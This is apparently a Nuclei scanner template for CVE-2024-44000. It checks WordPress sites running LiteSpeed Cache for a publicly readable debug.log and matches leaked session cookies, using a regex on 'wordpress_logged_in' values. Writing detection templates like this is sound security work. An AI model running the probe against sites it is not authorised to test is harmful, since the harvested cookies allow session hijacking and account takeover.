flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(body, "/wp-content/plugins/litespeed-cache")
    internal: true
    type: dsl
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: response
    regex:
    - (wordpress(_logged_in)?_[a-f0-9]{32}=[^;]+)
    type: regex
  - part: content_type
    type: word
    words:
    - text/plain
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-content/debug.log HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-44000
info:
  author: s4e-io
  classification:
    cve-id: CVE-2024-44000
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-532
  description: 'The LiteSpeed Cache plugin for WordPress is vulnerable to Sensitive
    Information Exposure in all versions up to, and including, 6.4.1 through the debug.log
    file that is publicly exposed. This makes it possible for unauthenticated attackers
    to view potentially sensitive information contained in the exposed log file. The
    log file may contain user cookies making it possible for an attacker to log in
    with any session that is actively valid and exposed in the log file. Note: the
    debug feature must be enabled for this to be a concern and this feature is disabled
    by default.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: liteSpeed-cache
    publicwww-query: /wp-content/plugins/litespeed-cache
    vendor: liteSpeed-technologies
    verified: true
  name: LiteSpeed Cache <= 6.4.1 - Sensitive Information Exposure
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/litespeed-cache/litespeed-cache-641-unauthenticated-sensitive-information-exposure-via-log-files
  - https://github.com/absholi7ly/CVE-2024-44000-LiteSpeed-Cache
  - https://github.com/gbrsh/CVE-2024-44000
  - https://thehackernews.com/2024/09/critical-security-flaw-found-in.html
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_litespeed_cookie_theft.rb
  severity: high
  tags: cve,cve2024,info-leak,takeover,wordpress,wp-plugin,litespeed-cache,wp
